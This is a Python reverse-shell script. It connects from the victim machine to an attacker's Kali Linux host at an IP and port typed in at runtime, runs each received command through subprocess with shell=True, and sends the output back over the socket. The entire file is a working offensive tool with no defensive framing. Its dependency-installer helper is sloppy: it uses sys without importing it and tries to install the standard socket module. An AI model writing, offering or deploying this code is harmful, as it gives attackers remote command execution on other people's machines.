import socket
import subprocess

# Function to install missing libraries
def install_dependencies():
    try:
        import pip
    except ImportError:
        print("Pip not found. Installing pip...")
        subprocess.check_call([sys.executable, '-m', 'ensurepip', '--upgrade'])
    
    required_libraries = ['socket']
    
    for lib in required_libraries:
        try:
            __import__(lib)
        except ImportError:
            print(f"{lib} is missing. Installing...")
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', lib])

# Reverse shell function
def reverse_shell(attacker_ip, attacker_port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Connect to the attacker machine
        s.connect((attacker_ip, attacker_port))

        # Start a command shell and redirect input/output to the socket
        while True:
            # Receive command from Kali Linux machine
            command = s.recv(1024).decode("utf-8")
            if command.lower() == "exit":
                break
            
            # Execute the command and send the result back
            if command.strip():
                output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                result = output.stdout.read() + output.stderr.read()
                s.send(result if result else b"Command executed, but no output.\n")
    
    except socket.error as err:
        print(f"Connection error: {err}")
    finally:
        s.close()

# Main function
if __name__ == "__main__":
    install_dependencies()

    # Prompt the user for the Kali Linux IP and port
    attacker_ip = input("Enter the IP address of the Kali Linux machine: ")
    attacker_port = int(input("Enter the port number (e.g., 4444): "))

    reverse_shell(attacker_ip, attacker_port)